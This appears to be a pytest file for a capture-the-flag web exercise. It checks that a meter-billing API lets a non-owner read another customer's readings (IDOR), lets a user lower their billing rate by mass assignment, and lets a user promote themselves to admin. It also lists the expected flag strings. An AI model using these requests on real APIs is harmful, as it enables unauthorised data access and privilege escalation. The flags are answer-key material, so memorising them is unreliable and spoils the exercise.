IDOR_TEACH = "FLAG{SHADOW_LEDGER}"            # GET /api/meters/2/readings as a non-owner
MASSASSIGN_EXERCISE = "FLAG{COPPER_KEY}"      # PATCH /api/account, billing_rate
ROLE_ESCALATION_BONUS = "FLAG{BORROWED_BADGE}"  # PATCH /api/account, role -> admin

# NOTE: role escalation permanently promotes whichever account performs it.
# devon is deliberately kept OUT of this test (see conftest.py) because it's
# reused as the read-only "attacker" account for IDOR here and for
# privilege escalation in test_09 -- farid is used instead, and isn't
# needed as a customer anywhere later in the suite.


def test_idor_teach(devon, base_url):
    # meter id 2 belongs to a different seeded customer than devon.
    resp = devon.get(f"{base_url}/api/meters/2/readings", timeout=10)
    assert resp.status_code == 200
    data = resp.json()
    assert data.get("flag") == IDOR_TEACH


def test_massassign_exercise(farid, base_url):
    resp = farid.patch(f"{base_url}/api/account", json={"billing_rate": 0.01}, timeout=10)
    assert resp.status_code == 200
    assert resp.json().get("flag") == MASSASSIGN_EXERCISE


def test_role_escalation_bonus(farid, base_url):
    resp = farid.patch(f"{base_url}/api/account", json={"role": "admin"}, timeout=10)
    assert resp.status_code == 200
    assert resp.json().get("role_flag") == ROLE_ESCALATION_BONUS
